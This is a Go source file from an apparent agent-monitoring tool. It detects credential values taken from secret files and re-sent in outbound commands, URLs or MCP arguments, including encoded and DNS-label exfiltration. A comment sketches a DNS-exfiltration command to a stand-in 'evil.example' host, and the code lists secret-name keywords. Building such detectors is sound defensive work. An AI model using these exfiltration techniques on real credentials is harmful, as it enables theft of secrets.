package rules

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"net/url"
	"path"
	"regexp"
	"sort"
	"strings"
	"unicode/utf8"

	"github.com/thomastysong/spoor/internal/classify"
	"github.com/thomastysong/spoor/internal/event"
)

// Data flow of credential VALUES within a session (threat research S1,
// red-team precision control 2): when a tool result comes from a
// credential-class source, the engine keeps keyed fingerprints of the
// values in it; a later command, URL or MCP argument that carries one of
// those values (raw, URL-encoded, base64 or hex) sets session.secret_flow.
// Fingerprints are HMAC-SHA-256 under a random per-session salt, so the
// exported session state neither contains the values nor lets anyone match
// them across sessions or hosts.
//
// Host names are a channel of their own (DNS exfiltration: curl
// https://<hex>.evil.example/, dig, nslookup, ping). Every dotted name in
// the outbound text is also split into its labels: each label, long labels
// cut at the 63-byte DNS label limit, and runs of consecutive labels joined
// (an encoder spreads one value over several labels) are candidates, raw
// and decoded as hex, base64, base64url or base32. A raw label match counts
// only for values that are credentials by format or by name: values kept
// only because they look machine generated are often identifiers (project
// refs, bucket names) that are legitimately used as subdomains.

const (
	minSecretValue  = 8
	maxSecretValue  = 4096
	maxSecretText   = 256 << 10 // secret-file output read for values: head and tail half each
	maxEnvLines     = 4096
	minValueEntropy = 3.0
)

// Bounds of the outbound scan. Every outbound string is scanned, shortest
// first, so a padding string sorts after the short value it is meant to
// hide; a string over flowTextScan is scanned on its head and tail. Hitting
// any bound sets session.secret_flow_truncated, so a padded request is
// never silently clean.
const (
	flowTextScan = 64 << 10 // longer strings: head and tail flowTextScan/2 each
	maxFlowBytes = 1 << 20  // bytes scanned per event
	maxFlowCands = 1 << 15  // distinct candidates fingerprinted or decoded per event
	maxFlowTexts = 1024     // MCP argument strings per event
)

var envLine = regexp.MustCompile(`^\s*(?:export\s+)?"?([A-Za-z_][A-Za-z0-9_.\-]{0,127})"?\s*[:=]\s*(.*?)\s*,?\s*$`)

var secretNameParts = []string{"KEY", "TOKEN", "SECRET", "PASS", "PWD", "AUTH", "CRED", "PRIVATE", "SESSION", "COOKIE", "SIGNATURE", "DSN", "CONN"}

func secretName(k string) bool {
	u := strings.ToUpper(k)
	for _, p := range secretNameParts {
		if strings.Contains(u, p) {
			return true
		}
	}
	return false
}

type secretValue struct {
	v, kind string
	weak    bool // kept for its entropy only (see secretFP.weak)
}

// secretValues extracts credential values from the output of a
// credential-class read: everything classify.FindSecrets recognises, plus
// the values of KEY=VALUE / "key": "value" lines whose name is secret-like
// or whose value looks machine generated (dotenv files, INI credential
// files, JSON key files).
func secretValues(text string) []secretValue {
	if len(text) > maxSecretText {
		text = cutHead(text, maxSecretText/2) + "\n" + cutTail(text, maxSecretText/2)
	}
	var out []secretValue
	seen := map[string]int{} // value -> index in out
	add := func(v, kind string, weak bool) {
		v = strings.TrimSpace(v)
		if len(v) < minSecretValue || len(v) > maxSecretValue {
			return
		}
		if i, ok := seen[v]; ok {
			if !weak {
				out[i].weak = false
			}
			return
		}
		seen[v] = len(out)
		out = append(out, secretValue{v, kind, weak})
	}
	for _, h := range classify.FindSecrets(text) {
		if h.Start >= 0 && h.End <= len(text) && h.Start < h.End {
			add(text[h.Start:h.End], h.Kind, false)
		}
	}
	lines := strings.SplitN(text, "\n", maxEnvLines+1)
	if len(lines) > maxEnvLines {
		lines = lines[:maxEnvLines]
	}
	for _, ln := range lines {
		m := envLine.FindStringSubmatch(ln)
		if m == nil {
			continue
		}
		v := strings.Trim(m[2], `"'`)
		if strings.ContainsAny(v, " \t") {
			continue
		}
		if named := secretName(m[1]); named || classify.Entropy(v) >= minValueEntropy {
			add(v, "env_value", !named)
		}
	}
	return out
}

func (s *sessionState) fingerprint(v string) string {
	return s.fingerprinter()(v)
}

// fingerprinter returns a function that fingerprints many values with one
// HMAC instance.
func (s *sessionState) fingerprinter() func(string) string {
	s.ensureSalt()
	m := hmac.New(sha256.New, s.salt)
	var buf [sha256.Size]byte
	return func(v string) string {
		m.Reset()
		m.Write([]byte(v))
		return hex.EncodeToString(m.Sum(buf[:0])[:12])
	}
}

// readsSecrets reports whether the event read a credential-class source.
func readsSecrets(f map[string]any) bool {
	if b, _ := f["path.sensitive_read"].(bool); b {
		return true
	}
	if cl, _ := f["shell.read_classes"].([]string); classify.IsSensitiveRead(cl) {
		return true
	}
	if ca, _ := f["shell.cred_access"].([]string); len(ca) > 0 {
		return true
	}
	if cl, _ := f["mcp.arg_path_classes"].([]string); classify.IsSensitiveRead(cl) {
		return true
	}
	return false
}

// captureSecrets records fingerprints of the credential values in the
// event's tool output when the event read a credential-class source.
func (s *sessionState) captureSecrets(ev *event.Event) {
	if ev.Content == nil || ev.Content.ToolOutput == "" || !readsSecrets(ev.Feat) {
		return
	}
	fp := s.fingerprinter()
	for _, sv := range secretValues(ev.Content.ToolOutput) {
		s.addSecret(fp(sv.v), sv.kind, len(sv.v), sv.weak)
	}
}

// outboundTexts returns the strings of the event that leave the machine:
// the command line of a shell command that contacts the network, the URL
// and query of a web tool, and every string argument of an MCP call; and
// whether the argument walk stopped at a bound.
func outboundTexts(ev *event.Event) ([]string, bool) {
	f := ev.Feat
	var out []string
	kind := event.ToolKind("")
	if ev.Tool != nil {
		kind = ev.Tool.Kind
	}
	if t := ev.Target; t != nil && t.Command != "" {
		hosts, _ := f["shell.hosts"].([]string)
		urls, _ := f["shell.urls"].([]string)
		nt, _ := f["shell.net_tools"].([]string)
		ex, _ := f["shell.exfil"].([]string)
		if len(hosts)+len(urls)+len(nt)+len(ex) > 0 {
			out = append(out, t.Command)
		}
	}
	cut := false
	switch kind {
	case event.ToolWebFetch, event.ToolWebSearch, event.ToolBrowser:
		if t := ev.Target; t != nil {
			out = append(out, t.URL, t.Query)
		}
		var in []string
		in, cut = inputStrings(ev, maxFlowTexts)
		out = append(out, in...)
	case event.ToolMCP:
		var in []string
		in, cut = inputStrings(ev, maxFlowTexts)
		out = append(out, in...)
	}
	return out, cut
}

// inputStrings returns up to limit string values of the tool input (depth
// 8), and whether it left any out.
func inputStrings(ev *event.Event, limit int) ([]string, bool) {
	if ev.Content == nil || len(ev.Content.ToolInput) == 0 {
		return nil, false
	}
	var out []string
	cut := false
	var walk func(v any, depth int)
	walk = func(v any, depth int) {
		if depth > 8 {
			cut = true
			return
		}
		switch t := v.(type) {
		case string:
			if len(out) >= limit {
				cut = true
				return
			}
			out = append(out, t)
		case map[string]any:
			keys := make([]string, 0, len(t))
			for k := range t {
				keys = append(keys, k)
			}
			sort.Strings(keys)
			for _, k := range keys {
				if len(out) >= limit {
					cut = true
					return
				}
				walk(t[k], depth+1)
			}
		case []any:
			for _, x := range t {
				if len(out) >= limit {
					cut = true
					return
				}
				walk(x, depth+1)
			}
		case []string:
			for _, x := range t {
				if len(out) >= limit {
					cut = true
					return
				}
				out = append(out, x)
			}
		}
	}
	walk(ev.Content.ToolInput, 0)
	return out, cut
}

// secretFlow returns the kinds of remembered credential values that appear
// in the event's outbound strings, whether anything was checked, and
// whether the scan stopped at a bound (some outbound text was not seen).
func (s *sessionState) secretFlow(ev *event.Event) (kinds []string, checked, truncated bool) {
	if len(s.secrets) == 0 || len(s.salt) == 0 {
		return nil, false, false
	}
	texts, truncated := outboundTexts(ev)
	if len(texts) == 0 {
		return nil, false, false
	}
	want := make(map[string]secretFP, len(s.secrets))
	sc := &flowScan{budget: maxFlowCands, seen: map[string]uint8{}, lens: map[int]bool{}}
	for _, x := range s.secrets {
		want[x.fp] = x
		if x.n > 0 {
			sc.lens[x.n] = true
		} else {
			sc.anyLen = true // state from before lengths were recorded
		}
	}
	found := map[string]bool{}
	fp := s.fingerprinter()
	sc.match = func(c string, weakToo bool) {
		if x, ok := want[fp(c)]; ok && (weakToo || !x.weak) {
			found[x.kind] = true
		}
	}
	// Shortest first: a value hidden behind a long padding string is
	// reached before the padding spends the byte budget.
	sort.SliceStable(texts, func(i, j int) bool { return len(texts[i]) < len(texts[j]) })
	total := 0
scan:
	for _, t := range texts {
		if t == "" {
			continue
		}
		parts := []string{t}
		if len(t) > flowTextScan {
			parts = []string{cutHead(t, flowTextScan/2), cutTail(t, flowTextScan/2)}
			truncated = true
		}
		for _, p := range parts {
			if total+len(p) > maxFlowBytes {
				truncated = true
				break scan
			}
			total += len(p)
			flowCandidates(p, sc)
		}
	}
	// Then the labels of every dotted name the token pass met, shortest
	// name first, so neither a long padded name nor label padding can
	// spend the budget before the plain tokens were seen.
	sort.SliceStable(sc.names, func(i, j int) bool { return len(sc.names[i]) < len(sc.names[j]) })
	for _, n := range sc.names {
		if sc.exhausted {
			break
		}
		sc.labelCandidates(n)
	}
	truncated = truncated || sc.exhausted
	for k := range found {
		kinds = append(kinds, k)
	}
	sort.Strings(kinds)
	return kinds, true, truncated
}

// cutHead returns at most n leading bytes of s without splitting a rune.
func cutHead(s string, n int) string {
	if len(s) <= n {
		return s
	}
	for n > 0 && !utf8.RuneStart(s[n]) {
		n--
	}
	return s[:n]
}

// cutTail returns at most n trailing bytes of s without splitting a rune.
func cutTail(s string, n int) string {
	if len(s) <= n {
		return s
	}
	i := len(s) - n
	for i < len(s) && !utf8.RuneStart(s[i]) {
		i++
	}
	return s[i:]
}

const coarseSep = " \t\r\n'\"`;|&<>(){}[],"

// Separator sets as byte tables (every separator is ASCII, so a byte scan
// never splits a multi-byte rune): coarse words, words split at key/value
// and URL punctuation, the same plus '/', and decoded text.
var (
	sepCoarse  = sepTable(coarseSep)
	sepKV      = sepTable("=:&?@#")
	sepKVPath  = sepTable("=:&?@#/")
	sepDecoded = sepTable(coarseSep + "=:")
)

func sepTable(seps string) *[256]bool {
	var t [256]bool
	for i := 0; i < len(seps); i++ {
		t[seps[i]] = true
	}
	return &t
}

// fields calls f with each maximal run of s that holds no separator byte.
func fields(s string, sep *[256]bool, f func(string)) {
	start := -1
	for i := 0; i < len(s); i++ {
		if sep[s[i]] {
			if start >= 0 {
				f(s[start:i])
				start = -1
			}
		} else if start < 0 {
			start = i
		}
	}
	if start >= 0 {
		f(s[start:])
	}
}

// flowScan carries the candidate budget of one event. A candidate is
// fingerprinted only when its length is the length of a remembered value,
// each distinct candidate is considered once per way it was found, and a
// candidate that can be neither fingerprinted nor decoded costs nothing,
// so repeated or wrong-length padding spends no budget.
type flowScan struct {
	budget    int
	seen      map[string]uint8 // candidate -> what was done with it (seen* bits)
	lens      map[int]bool
	anyLen    bool
	match     func(c string, weakToo bool)
	exhausted bool
	// names are the dotted tokens met by the token pass, for the label
	// pass; named dedups them.
	names []string
	named map[string]bool
}

// What consider did with a candidate.
const (
	seenAll     uint8 = 1 << iota // fingerprinted against every remembered value
	seenStrong                    // fingerprinted against values that are credentials by format or name
	seenDecoded                   // decodings tried
)

// candMode says where a candidate came from, which decides which
// remembered values it may match and whether it is decoded.
type candMode uint8

const (
	candToken   candMode = iota // a token of the outbound text: any value; decoded
	candDecoded                 // text a decoding produced: any value; not decoded again
	candLabel                   // a DNS label or consecutive labels run together: strong values raw; decoded, base32 too
	candDotted                  // consecutive labels with their dots: strong values raw; not decoded
)

// flowCandidates considers every substring of text that could be a whole
// credential value: tokens at three granularities, each also after URL,
// base64 and hex decoding (one level). Tokens with a dot are remembered
// for the label pass.
func flowCandidates(text string, sc *flowScan) {
	versions := []string{text}
	if strings.ContainsRune(text, '%') {
		if d, err := url.QueryUnescape(text); err == nil && d != text {
			versions = append(versions, d)
		}
	}
	for _, v := range versions {
		fields(v, sepCoarse, func(tok string) {
			if sc.exhausted {
				return
			}
			sc.consider(tok, candToken)
			sc.noteName(tok)
			fields(tok, sepKV, func(sub string) {
				if sub != tok {
					sc.consider(sub, candToken)
					sc.noteName(sub)
				}
			})
			fields(tok, sepKVPath, func(sub string) {
				if sub != tok {
					sc.consider(sub, candToken)
					sc.noteName(sub)
				}
			})
		})
		if sc.exhausted {
			return
		}
	}
}

// noteName remembers a token that could be a host name for the label pass.
func (sc *flowScan) noteName(tok string) {
	if len(tok) < minSecretValue || strings.IndexByte(tok, '.') < 0 {
		return
	}
	if sc.named == nil {
		sc.named = map[string]bool{}
	}
	if !sc.named[tok] {
		sc.named[tok] = true
		sc.names = append(sc.names, tok)
	}
}

func (sc *flowScan) consider(c string, mode candMode) {
	if len(c) < minSecretValue || len(c) > maxSecretValue {
		return
	}
	var want uint8
	if sc.anyLen || sc.lens[len(c)] {
		want = seenStrong
		if mode == candToken || mode == candDecoded {
			want |= seenAll
		}
	}
	if (mode == candToken || mode == candLabel) && len(c) >= 12 {
		want |= seenDecoded // decodings need 12+ bytes
	}
	have, ok := sc.seen[c]
	todo := want &^ have
	if todo == 0 {
		return // neither a possible value nor decodable, or done already
	}
	if !ok {
		if sc.budget <= 0 {
			sc.exhausted = true
			return
		}
		sc.budget--
	}
	sc.seen[c] = have | todo
	if todo&(seenAll|seenStrong) != 0 {
		sc.match(c, todo&seenAll != 0)
	}
	if todo&seenDecoded == 0 {
		return
	}
	for _, d := range decodings(c, mode == candLabel) {
		sc.consider(strings.TrimSpace(d), candDecoded)
		fields(d, sepDecoded, func(tok string) { sc.consider(tok, candDecoded) })
	}
}

// Bounds of the label pass over one dotted name.
const (
	maxDNSLabel      = 63  // longer labels are also cut into pieces of this size
	maxLabelRun      = 16  // pieces run together into one candidate
	maxLabelRunBytes = 512 // bytes of one run (a DNS name is at most 253)
)

// labelCandidates considers the labels of a dotted name: every label (a
// label over 63 bytes also in 63-byte pieces) and every run of up to 16
// consecutive pieces joined without the dots, raw and decoded, because an
// encoder that spreads one value over several labels is undone by
// concatenation; and every run of whole labels with its dots, raw, for a
// value that has dots of its own (a JWT).
func (sc *flowScan) labelCandidates(name string) {
	var labels [][2]int // [start, end) of each label, empty ones included
	start := 0
	for i := 0; i <= len(name); i++ {
		if i == len(name) || name[i] == '.' {
			labels = append(labels, [2]int{start, i})
			start = i + 1
		}
	}
	if len(labels) < 2 {
		return
	}
	for i := 0; i < len(labels) && !sc.exhausted; i++ {
		for j := i + 1; j < len(labels); j++ {
			a, b := labels[i][0], labels[j][1]
			if b-a > maxLabelRunBytes {
				break
			}
			if i > 0 || j < len(labels)-1 { // the whole name was a token
				sc.consider(name[a:b], candDotted)
			}
		}
	}
	var pieces []string
	for _, l := range labels {
		p := name[l[0]:l[1]]
		for len(p) > maxDNSLabel {
			pieces = append(pieces, p[:maxDNSLabel])
			p = p[maxDNSLabel:]
		}
		if p != "" {
			pieces = append(pieces, p)
		}
	}
	ok64 := make([]bool, len(pieces))
	for i, p := range pieces {
		ok64[i] = isBase64ish(p)
	}
	var buf []byte
	for i := range pieces {
		if sc.exhausted {
			return
		}
		sc.consider(pieces[i], candLabel)
		buf = append(buf[:0], pieces[i]...)
		dec := ok64[i]
		for j := i + 1; j < len(pieces) && j-i < maxLabelRun; j++ {
			if len(buf)+len(pieces[j]) > maxLabelRunBytes {
				break
			}
			buf = append(buf, pieces[j]...)
			dec = dec && ok64[j]
			// Materialise the run only when it could be a value or decode
			// to text holding one.
			if sc.anyLen || sc.lens[len(buf)] || dec && len(buf) >= 12 {
				sc.consider(string(buf), candLabel)
			}
		}
	}
}

// base32NoPad decodes the base32 that DNS tunnels use (RFC 4648, no
// padding; labels are case-insensitive, so input is upper-cased first).
var base32NoPad = base32.StdEncoding.WithPadding(base32.NoPadding)

// decodings returns c decoded as base64 (any alphabet) or hex, and with
// dns also as base32, when it decodes to text.
func decodings(c string, dns bool) []string {
	var out []string
	if len(c) >= 12 && isBase64ish(c) {
		for _, enc := range []*base64.Encoding{base64.StdEncoding, base64.RawStdEncoding, base64.URLEncoding, base64.RawURLEncoding} {
			if b, err := enc.DecodeString(c); err == nil && printable(b) {
				out = append(out, string(b))
				break
			}
		}
	}
	if len(c) >= 16 && len(c)%2 == 0 {
		if b, err := hex.DecodeString(c); err == nil && printable(b) {
			out = append(out, string(b))
		}
	}
	if dns && len(c) >= 13 && isBase32ish(c) {
		if b, err := base32NoPad.DecodeString(strings.ToUpper(strings.TrimRight(c, "="))); err == nil && printable(b) {
			out = append(out, string(b))
		}
	}
	return out
}

func isBase64ish(s string) bool {
	for i := 0; i < len(s); i++ {
		c := s[i]
		if !(c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c >= '0' && c <= '9' || c == '+' || c == '/' || c == '=' || c == '-' || c == '_') {
			return false
		}
	}
	return true
}

func isBase32ish(s string) bool {
	for i := 0; i < len(s); i++ {
		c := s[i]
		if !(c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c >= '2' && c <= '7' || c == '=') {
			return false
		}
	}
	return true
}

func printable(b []byte) bool {
	if len(b) == 0 || !utf8.Valid(b) {
		return false
	}
	for _, c := range b {
		if c < 0x20 && c != '\n' && c != '\r' && c != '\t' {
			return false
		}
	}
	return true
}

// pathDigest normalizes a path lexically (home expansion, cwd join, clean,
// case folding where the filesystem folds) and hashes it, so "./run.sh",
// "run.sh" and "/repo/run.sh" in the same session compare equal.
func pathDigest(p, cwd, home, goos string) string {
	p = strings.Trim(strings.TrimSpace(p), `"'`)
	if p == "" || len(p) > 4096 {
		return ""
	}
	win := goos == "windows"
	p = strings.ReplaceAll(p, `\`, "/")
	switch {
	case p == "~" || strings.HasPrefix(p, "~/"):
		if home == "" {
			return ""
		}
		p = strings.ReplaceAll(home, `\`, "/") + p[1:]
	case strings.HasPrefix(p, "$HOME/") || strings.HasPrefix(p, "${HOME}/"):
		if home == "" {
			return ""
		}
		p = strings.ReplaceAll(home, `\`, "/") + p[strings.IndexByte(p, '/'):]
	}
	abs := strings.HasPrefix(p, "/") || (len(p) >= 2 && p[1] == ':')
	if !abs {
		if cwd == "" {
			return ""
		}
		p = strings.ReplaceAll(cwd, `\`, "/") + "/" + p
	}
	p = path.Clean(p)
	if win || goos == "darwin" {
		p = strings.ToLower(p)
	}
	sum := sha256.Sum256([]byte(p))
	return hex.EncodeToString(sum[:8])
}

// execPaths returns the paths an event executes.
func execPaths(ev *event.Event) []string {
	var out []string
	if l, ok := ev.Feat["shell.executes_paths"].([]string); ok {
		out = append(out, l...)
	}
	if ev.Type == event.TypeProcessExec && ev.Process != nil && ev.Process.Exe != "" {
		out = append(out, ev.Process.Exe)
	}
	return out
}

// writtenPaths returns the paths an event writes: file tool targets, shell
// redirections and copy destinations, and the path arguments of an MCP
// tool whose name says it writes.
func writtenPaths(ev *event.Event) []string {
	var out []string
	if ev.Tool != nil {
		switch ev.Tool.Kind {
		case event.ToolFileWrite, event.ToolFileEdit:
			if t := ev.Target; t != nil {
				if t.Path != "" {
					out = append(out, t.Path)
				}
				out = append(out, t.Paths...)
			}
		case event.ToolMCP:
			name := strings.ToLower(ev.Tool.MCPTool)
			for _, w := range []string{"write", "create", "edit", "save", "put", "upload", "move", "copy"} {
				if strings.Contains(name, w) {
					if l, ok := ev.Feat["mcp.arg_paths"].([]string); ok {
						out = append(out, l...)
					}
					break
				}
			}
		}
	}
	if l, ok := ev.Feat["shell.writes"].([]string); ok {
		out = append(out, l...)
	}
	return out
}
